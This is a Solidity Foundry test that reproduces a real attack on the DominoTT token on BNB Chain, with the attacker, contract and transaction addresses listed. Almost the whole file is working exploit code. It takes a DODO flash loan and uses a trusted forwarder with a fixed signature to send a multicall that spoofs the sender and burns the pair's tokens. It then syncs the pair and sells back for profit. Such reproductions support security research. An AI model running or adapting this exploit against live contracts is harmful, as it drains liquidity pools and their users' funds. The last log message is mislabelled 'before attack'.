// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~5 $WBNB
// Attacker : https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502
// Attack Contract : https://bscscan.com/address/0xaed80b8a821607981e5e58b7a753a3336c0bfd6f
// Vulnerable Contract : https://bscscan.com/address/0x0dabdc92af35615443412a336344c591faed3f90
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/bsc/0x1ee617cd739b1afcc673a180e60b9a32ad3ba856226a68e8748d58fcccc877a8


import "forge-std/Test.sol";
import "./../interface.sol";

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IDominoTTWBNBN {
    function sync() external;
}
interface IForwarder {
    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
    }
    function getNonce(address from) external view returns (uint256);
    function execute(ForwardRequest memory req, bytes memory signature) external payable returns (bool, bytes memory);
}

interface IDominoTT is IERC20 {
    function burn(uint256 amount) external;
    function multicall(
        bytes[] memory data
    ) external returns (bytes[] memory results);
}


contract ContractTest is Test {

    IDominoTT DominoTT = IDominoTT(0x0DaBDC92aF35615443412A336344c591FaEd3f90);
    IForwarder Forwarder = IForwarder(0x7C4717039B89d5859c4Fbb85EDB19A6E2ce61171);
    IDominoTTWBNBN Pair = IDominoTTWBNBN(0x4f34b914D687195A73318ccC58D56D242b4dCcF6);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);    
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IDPPAdvanced DODO = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    address attacker = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    function setUp() public {
        vm.createSelectFork("bsc", 34141660 - 1);
        vm.label(address(DominoTT), "DominoTT");
    }

    function testExploit() public {
        emit log_named_uint("Attacker WBNB balance before attack", WBNB.balanceOf(address(this)));
        DominoTT.approve(address(Router), type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        DODO.flashLoan(0.5 * 1e18, 0, address(this), new bytes(1));
        emit log_named_uint("Attacker WBNB balance before attack", WBNB.balanceOf(address(this)));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        require(msg.sender == address(DODO), "Fail");
        WBNBTOTOKEN();

        uint256 amountToBurn = 1970000 * 1e18;
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodePacked(IDominoTT.burn.selector, amountToBurn, address(Pair));
        bytes memory data_muliti = abi.encodeWithSelector(IDominoTT.multicall.selector, datas);

        IForwarder.ForwardRequest memory req = IForwarder.ForwardRequest({
            from: attacker,
            to: address(DominoTT),
            value: 0,
            gas: 5e6,
            nonce: Forwarder.getNonce(attacker),
            data: data_muliti
        });
        //bytes32 ethMessagessign =  toTypedDataHash(bytes32(0x99d026edad79cd8998e26685e38b0fe8e2b6a9a325835609c9e4aedb3056e1a0), keccak256(abi.encode(TYPEHASH, req.from, req.to, req.value, req.gas, req.nonce, keccak256(req.data))));
        bytes32 r = 0xc065407074ef2e05acdd73a1b1c96c6fa4215c8298f1b78b549d6849e3d84e47;
        bytes32 s = 0x5decf131b7477236ea72bb15dfb89ea226dff05cd173063e34fe9aea54e667f7;
        uint8 v = 27;
        bytes memory signature = abi.encodePacked(r, s, v);

        Forwarder.execute(req, signature);
        Pair.sync();
        TOKENTOWBNB();

        WBNB.transfer(address(DODO), 0.5 * 1e18);
    }

    function WBNBTOTOKEN() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(DominoTT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.5 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function TOKENTOWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(DominoTT);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DominoTT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
    
    //function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32) {
    //    return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    //}
    
    fallback() external payable {}
    receive() external payable {}
}
